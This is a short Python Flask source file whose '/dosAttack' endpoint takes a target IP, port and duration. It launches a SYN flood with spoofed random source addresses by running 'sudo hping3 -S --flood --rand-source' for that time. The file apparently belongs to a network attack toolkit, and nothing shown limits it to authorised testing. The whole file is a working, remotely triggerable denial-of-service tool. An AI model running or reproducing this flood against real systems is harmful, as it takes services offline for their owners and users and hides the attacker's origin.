from flask import Blueprint, request
import nmap
import signal
import subprocess
from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort
import time

dosAttack = Blueprint("dosAttack", __name__, url_prefix="/dosAttack")

@dosAttack.post("/")
def SYNFloodAttack():
    data = request.get_json()
    ipAddress = data["ipAddress"]
    portNumber = data["portNumber"]
    # type = data["type"]
    duration = int(data["duration"])

    dosCommand = subprocess.Popen(['sudo', 'hping3', '-S', '--flood', '--rand-source', '-p', portNumber, ipAddress])
    time.sleep(duration) # carry out attack for specified duration

    try:
        # Send CTRL+c to kill the child process
        dosCommand.send_signal(signal.SIGINT)
    except subprocess.TimeoutExpired:
        print('Timeout occured')
    
    dosCommand.kill()

    return "DoS Complete"


